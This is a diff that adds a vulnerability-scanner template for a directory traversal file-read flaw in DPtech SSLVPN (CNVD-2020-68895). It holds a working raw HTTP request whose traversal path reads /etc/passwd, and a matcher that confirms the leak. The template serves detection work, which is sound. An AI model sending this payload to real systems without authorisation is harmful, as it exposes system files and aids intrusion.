@@ -1,0 +1,22 @@
+id: dptech-sslvpn-readfile-cnvd-2020-68895
+info:
+  name: DPtech SSLVPN File Read (CNVD-2020-68895)
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    This template detects a file read vulnerability in DPtech SSLVPN. Arbitrary file read can be achieved by exploiting a directory traversal vulnerability.
+  reference:
+    - https://vul.wangan.com/a/CNVD-2020-68895
+http:
+  - raw:
+      - |
+        GET /sslvpn/img/../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "(?i)(root|toor):[x*]:0:0:"
